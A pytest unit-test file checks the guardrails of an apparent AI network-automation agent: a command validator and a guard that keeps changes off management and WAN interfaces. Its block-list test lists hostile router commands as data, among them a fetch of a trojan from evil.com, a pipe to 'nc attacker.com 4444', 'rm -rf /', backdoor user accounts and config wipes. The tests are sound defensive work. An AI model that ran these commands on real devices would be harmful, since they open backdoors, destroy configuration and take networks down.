"""Unit tests for Guardrails and Blast Radius policies."""

import pytest

from networking_agent.core.exceptions import BlastRadiusViolationError, CommandInjectionError
from networking_agent.guardrails.blast_radius import BlastRadiusGuard
from networking_agent.guardrails.validator import CommandValidator
from networking_agent.models.intent import NetworkIntent


def test_command_validator_accepts_clean_commands():
    clean_cmds = [
        "interface Ethernet1/1",
        "mtu 9216",
        "no shutdown",
    ]
    validated = CommandValidator.validate_command_list(clean_cmds)
    assert validated == clean_cmds


@pytest.mark.parametrize(
    "forbidden_cmd",
    [
        "reload",
        "format flash:",
        "erase startup-config",
        "username attacker privilege 15 secret 0 hacked",
        "no ip routing",
        "crypto key zeroize rsa",
        "interface Gi0/1; reload",
        "/system reset-configuration",
        "system default-configuration",
        '/tool fetch url="http://evil.com/trojan.rsc"',
        "/tool traffic-generator start",
        "/user add name=backdoor password=evil group=full",
        "/ip socks set enabled=yes",
        "/system script add name=backdoor source=reboot",
        "interface Gi0/1 | nc attacker.com 4444",
        "interface Gi0/1 && rm -rf /",
        "interface Gi0/1 \\",
        "request system zeroize",
        "request system reboot",
        "guestshell enable",
        "start shell",
    ],
)
def test_command_validator_blocks_dangerous_commands(forbidden_cmd):
    with pytest.raises(CommandInjectionError):
        CommandValidator.validate_command_list([forbidden_cmd])


@pytest.mark.parametrize("protected_iface", ["Management0", "mgmt0", "GigabitEthernet0/0", "Loopback0"])
def test_blast_radius_guard_protects_critical_interfaces(protected_iface):
    guard = BlastRadiusGuard()
    intent = NetworkIntent(
        diagnosis="Attempting to disable management port",
        severity="CRITICAL",
        requires_config_change=True,
        action="disable_interface",
        target_interface=protected_iface,
    )
    with pytest.raises(BlastRadiusViolationError):
        guard.verify_intent(intent)


def test_blast_radius_guard_allows_safe_interfaces():
    guard = BlastRadiusGuard()
    intent = NetworkIntent(
        diagnosis="Normal edge port modification",
        severity="MEDIUM",
        requires_config_change=True,
        action="set_interface_mtu",
        target_interface="Ethernet1/10",
        mtu_value=9000,
    )
    # Should not raise
    guard.verify_intent(intent)


@pytest.mark.parametrize("disruptive_action", ["disable_interface", "restart_interface"])
def test_blast_radius_blocks_wan_and_uplink_disruption(disruptive_action):
    guard = BlastRadiusGuard()

    # Attempting to bounce or disable ether1 (default WAN)
    intent = NetworkIntent(
        diagnosis="Flapping link on ether1 WAN",
        severity="HIGH",
        requires_config_change=True,
        action=disruptive_action,  # type: ignore
        target_interface="ether1",
    )
    with pytest.raises(BlastRadiusViolationError, match="CRITICAL SAFETY VIOLATION.*WAN / Uplink"):
        guard.verify_intent(intent, wan_interfaces=["ether1"])


def test_blast_radius_permits_informative_diagnosis_on_wan():
    guard = BlastRadiusGuard()

    # Informative diagnosis of link flap on WAN (action='none')
    intent = NetworkIntent(
        diagnosis="Layer 1 flapping detected on ether1 WAN. Recommend cable check.",
        severity="MEDIUM",
        requires_config_change=False,
        action="none",
        target_interface="ether1",
    )
    # Should not raise
    guard.verify_intent(intent, wan_interfaces=["ether1"])
